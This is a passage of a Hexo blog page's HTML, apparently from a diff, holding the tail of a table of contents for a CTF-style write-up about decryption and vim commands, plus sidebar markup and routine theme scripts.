href="#%E6%89%93%E5%BC%80%E7%BD%91%E7%AB%99%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%A7%A3%E5%AF%86%EF%BC%9A"><span class="toc-number">0.1.2.</span> <span class="toc-text">打开网站就可以直接解密：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88WP%EF%BC%9A"><span class="toc-number">0.2.</span> <span class="toc-text">答案WP：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%91%E4%BB%AC%E6%89%93%E5%BC%80kali%E4%BD%BF%E7%94%A8vim%E6%89%93%E5%BC%80%E5%BA%B7%E5%BA%B7"><span class="toc-number">0.2.1.</span> <span class="toc-text">我们打开kali使用vim打开康康</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EVIM%E7%9A%84%E6%8C%87%E4%BB%A4%EF%BC%9A"><span class="toc-number">0.3.</span> <span class="toc-text">关于VIM的指令：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%BE%91%E5%91%BD%E4%BB%A4"><span class="toc-number">0.3.1.</span> <span class="toc-text">编辑命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%80%E5%87%BAVim"><span class="toc-number">0.3.2.</span> <span class="toc-text">退出Vim</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Flight-star" class="lazyload">
+  <div class="sidebar-author-name">Flight-star</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">About</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+      <div class="sidebar-menu-icon icon-taichi"></div>
+      <div class="sidebar-menu-link">Friend</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@2.3.0/dist/quicklink.umd.js"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.3.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
